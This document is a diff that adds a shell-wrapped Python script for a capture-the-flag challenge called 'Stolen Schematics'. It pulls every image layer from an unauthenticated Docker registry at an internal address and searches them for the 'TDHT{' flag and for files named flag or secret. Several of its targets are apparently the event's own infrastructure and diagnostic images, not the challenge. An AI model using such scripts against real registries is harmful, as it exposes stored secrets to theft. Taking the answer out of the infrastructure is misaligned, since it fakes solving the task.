@@ -1,0 +1,109 @@
+# STOLEN SCHEMATICS - Search DIAGNOSTIC Image
+# The diagnostic image likely contains the flag or solution!
+
+python3 << 'PYEND'
+import urllib.request, json, gzip, io, tarfile
+
+REG = "http://172.27.0.1:5000"
+
+# Search ALL repositories, prioritizing diagnostic
+repos_to_search = [
+    ("infra/stolen-schematics-diagnostic", ["team131", "team131-v2"]),
+    ("infra/stolen-schematics", ["latest"]),
+    ("images/stolen-schematics-watcher", ["v1", "team131-fix"]),
+    ("images/stolen-schematics-gameserver", ["v1"]),
+    ("images/stolen-schematics-game-server-prerelease", ["v2.5.39"])
+]
+
+def gj(u):
+    r = urllib.request.Request(u)
+    r.add_header("Accept", "application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json")
+    return json.load(urllib.request.urlopen(r, timeout=20))
+
+for repo, tags in repos_to_search:
+    for tag in tags:
+        print(f"\n{'='*60}")
+        print(f"Searching: {repo}:{tag}")
+        print("="*60)
+        
+        try:
+            m = gj(f"{REG}/v2/{repo}/manifests/{tag}")
+            layers = m.get("layers", m.get("fsLayers", []))
+            
+            print(f"Found {len(layers)} layers")
+            
+            for idx, L in enumerate(layers):
+                digest = L.get("digest", L.get("blobSum"))
+                size = L.get("size", 0)
+                
+                print(f"\n[Layer {idx}] Size: {size:,} bytes")
+                
+                try:
+                    url = f"{REG}/v2/{repo}/blobs/{digest}"
+                    d = urllib.request.urlopen(url, timeout=30).read()
+                    
+                    # Decompress
+                    try:
+                        raw = gzip.decompress(d)
+                    except:
+                        raw = d
+                    
+                    # Search for flag in raw data
+                    if b"TDHT{" in raw:
+                        print("\n" + "🎯"*30)
+                        print("FOUND FLAG IN RAW DATA!")
+                        print("🎯"*30)
+                        idx = raw.find(b"TDHT{")
+                        flag_section = raw[idx:idx+100]
+                        print(flag_section.decode('utf-8', 'replace'))
+                        exit(0)
+                    
+                    # Try as tarball
+                    try:
+                        tf = tarfile.open(fileobj=io.BytesIO(raw))
+                        for mem in tf.getmembers():
+                            if mem.isfile():
+                                try:
+                                    content = tf.extractfile(mem).read()
+                                    
+                                    if b"TDHT{" in content:
+                                        print("\n" + "🎯"*30)
+                                        print(f"FOUND FLAG in file: {mem.name}")
+                                        print("🎯"*30)
+                                        print(content.decode('utf-8', 'replace')[:500])
+                                        exit(0)
+                                    
+                                    # Look for interesting files
+                                    if "flag" in mem.name.lower() or "secret" in mem.name.lower():
+                                        print(f"  📄 Interesting file: {mem.name}")
+                                        decoded = content.decode('utf-8', 'replace')[:300]
+                                        print(f"     Content: {decoded}")
+                                    
+                                    # Look for sync-loop.sh
+                                    if "sync-loop.sh" in mem.name:
+                                        print(f"  📜 Found sync-loop.sh!")
+                                        decoded = content.decode('utf-8', 'replace')
+                                        print(decoded)
+                                        if "TDHT" in decoded or "FLAG" in decoded:
+                                            print("\n🎯 FLAG MIGHT BE HERE!")
+                                
+                                except:
+                                    pass
+                    except:
+                        # Not a tarball, search as text
+                        text = raw.decode('utf-8', 'replace')
+                        if "TDHT" in text:
+                            print("🎯 Found 'TDHT' in layer text!")
+                            idx = text.find("TDHT")
+                            print(text[max(0,idx-50):idx+150])
+                
+                except Exception as e:
+                    print(f"  Error: {str(e)[:100]}")
+        
+        except Exception as e:
+            print(f"Error with {repo}:{tag} - {e}")
+
+print("\n" + "="*60)
+print("Search complete - no flag found in any layer")
+print("="*60)
+PYEND
